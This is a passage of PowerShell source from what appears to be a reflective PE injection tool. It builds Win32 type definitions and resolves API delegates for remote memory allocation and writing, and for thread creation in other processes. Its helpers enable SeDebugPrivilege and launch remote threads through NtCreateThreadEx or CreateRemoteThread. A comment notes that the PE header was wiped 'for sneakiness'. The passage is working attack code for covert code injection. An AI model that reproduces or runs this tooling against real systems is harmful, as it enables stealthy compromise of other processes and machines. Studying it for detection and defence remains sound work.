        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
        [IntPtr]
        $EndAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr]::Zero
        if ($PsCmdlet.ParameterSetName -eq "Size")
        {
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        }
        else
        {
            $FinalEndAddress = $EndAddress
        }
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
